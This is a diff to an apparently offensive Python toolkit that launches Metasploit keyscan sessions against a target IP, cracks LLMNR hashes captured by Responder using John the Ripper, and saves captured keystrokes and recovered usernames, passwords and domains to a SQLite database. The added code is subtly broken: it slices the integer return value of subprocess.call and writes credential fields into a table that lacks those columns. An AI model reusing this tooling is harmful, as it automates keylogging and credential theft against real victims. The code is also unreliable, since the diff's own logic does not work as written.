@@ -191,9 +191,10 @@ def createtablesE():
     (id integer primary key, Target_IP TEXT, Port TEXT, Exploit TEXT, Payload TEXT, Listening TEXT)''')
     conn.commit()
     conn.execute('''CREATE TABLE IF NOT EXISTS ExpDB.Keyscan 
-    (id integer primary key, Target_IP TEXT, Port TEXT, Exploit TEXT, Payload TEXT, Listening TEXT, Keyscan_Runtime TEXT)''')
+    (id integer primary key, Target_IP TEXT, Port TEXT, Exploit TEXT, Payload TEXT, Listening TEXT, Keyscan_Runtime TEXT, Clean_Content TEXT)''')
     conn.commit()
-    conn.execute('''CREATE TABLE IF NOT EXISTS ExpDB.LLMNR (id integer primary key, Host_Name, )''')
+    conn.execute('''CREATE TABLE IF NOT EXISTS ExpDB.LLMNR 
+    (id integer primary key, Username TEXT, Password TEXT, Domain TEXT, Password_Hash TEXT)''')
     conn.commit()
 def droptablesE():
     conn.execute('''DELETE FROM ExpDB.Packet_Sniffing''')
@@ -1694,11 +1695,6 @@ def keyscan_exploit():
     lport = "444"
     listen_sleep = input("How long do you want to listen for (in seconds)? ")
     keyscan_sleep = input("How long do you want to run the keyscan for (in seconds)? ")
-    klist = [lhost, lport, exploit, payload, listen_sleep, keyscan_sleep]
-    cur.execute('''INSERT INTO ExpDB.Keyscan 
-    (id, Target_IP, Port, Exploit, Payload, Listening, Keyscan_Runtime) 
-    VALUES (NULL, ?, ?, ?, ?, ?, ?)''', klist)
-    conn.commit()
     
     # Run msfconsole in new terminal
     process = subprocess.Popen(['gnome-terminal', '-e', 'msfconsole -x "use {}; \
@@ -1726,6 +1722,12 @@ def keyscan_exploit():
     # Remove color codes using regular expressions
     clean_content = re.sub(r'\\[\d+m', '', content)
 
+    klist = [lhost, lport, exploit, payload, listen_sleep, keyscan_sleep, clean_content]
+    cur.execute('''INSERT INTO ExpDB.Keyscan 
+    (id, Target_IP, Port, Exploit, Payload, Listening, Keyscan_Runtime, Clean_Content) 
+    VALUES (NULL, ?, ?, ?, ?, ?, ?, ?)''', klist)
+    conn.commit()
+
     # Print the clean content
     print(clean_content)
     
@@ -1742,6 +1744,12 @@ def crack_hash_generated():
     crack_hash = subprocess.call(['gnome-terminal', '-e', 'bash -c "john Responder/logs/{}; exec bash"'.format(hash_file)])
     show_hash = subprocess.call("john Responder/logs/{} --show".format(hash_file), shell=True)
     print(type(show_hash))
+    clean_hashA = show_hash[2:]
+    clean_hashB = clean_hashA.split(":")
+    cur.execute('''INSERT INTO ExpDB.Keyscan 
+    (id, Username, Password, Domain, Password_Hash) 
+    VALUES (NULL, ?, ?, ?, ?)''', clean_hashB)
+    conn.commit()
 
 def zap_scan():
     run_zap = "python3 zap.py"
